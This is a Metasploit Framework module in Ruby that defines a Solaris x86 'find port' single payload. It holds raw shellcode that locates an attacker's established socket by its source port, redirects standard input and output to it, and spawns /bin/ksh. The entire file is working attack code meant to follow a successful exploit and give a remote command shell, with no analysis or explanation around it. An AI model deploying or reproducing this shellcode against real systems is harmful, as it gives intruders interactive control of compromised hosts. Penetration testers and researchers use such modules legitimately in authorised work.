require 'msf/core'
require 'msf/core/handler/find_port'
require 'msf/base/sessions/command_shell'

module Msf
module Payloads
module Singles
module Solaris
module X86

module ShellFindPort

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Solaris Command Shell, Find Port Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Spawn a shell on an established connection',
			'Author'        => 'LSD <unknown@lsd>',
			'Platform'      => 'solaris',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::FindPort,
			'Session'       => Msf::Sessions::CommandShell,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'CPORT' => [ 39, 'n' ],
						},
					'Payload' =>
						"\x56\x5f\x83\xef\x7c\x57\x8d\x4f\x10\xb0\x91\xab\xab\x91\xab\x95" +
						"\xb5\x54\x51\x66\xb9\x01\x01\x51\x33\xc0\xb0\x36\xff\xd6\x59\x33" +
						"\xdb\x3b\xc3\x75\x0a\x66\xbb\x00\x00\x66\x39\x5d\x02\x74\x02\xe2" +
						"\xe6\x6a\x09\x51\x91\xb1\x03\x49\x89\x4c\x24\x08\x41\xb0\x3e\xff" +
						"\xd6\xe2\xf4\x33\xc0\x50\xb0\x17\xff\xd6\x68\x62\x2e\x2e\x2e\x89" +
						"\xe7\x33\xc0\x88\x47\x03\x57\xb0\x50\xff\xd6\x57\xb0\x3d\xff\xd6" +
						"\x47\x33\xc9\xb1\xff\x57\xb0\x0c\xff\xd6\xe2\xfa\x47\x57\xb0\x3d" +
						"\xff\xd6\xeb\x12\x33\xd2\x58\x8d\x78\x14\x57\x50\xab\x92\xab\x88" +
						"\x42\x08\xb0\x0b\xff\xd6\xe8\xe9\xff\xff\xff\x2f\x62\x69\x6e\x2f" +
						"\x6b\x73\x68"
				}
			))
	end

end

end end end end end
